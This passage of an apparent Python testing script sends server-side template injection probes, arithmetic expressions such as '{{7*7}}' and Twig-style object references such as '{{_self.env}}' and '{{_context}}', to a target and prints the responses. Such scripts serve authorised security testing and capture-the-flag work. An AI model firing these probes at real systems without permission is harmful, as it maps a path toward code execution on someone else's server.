category_a = [
    ("Multiplication", "{{7*7}}"),
    ("Addition", "{{1+1}}"),
    ("Multiplication 2", "{{3*3}}")
]

for label, payload in category_a:
    status, response = send_payload(payload)
    print_payload_result("A", label, payload, status, response)

# Category B: Object References
print("\n\n" + "="*70)
print("CATEGORY B: OBJECT REFERENCES")
print("="*70)

category_b = [
    ("_self object", "{{_self}}"),
    ("_self.env", "{{_self.env}}"),
    ("_context", "{{_context}}"),
    ("GLOBALS", "{{GLOBALS}}")
]

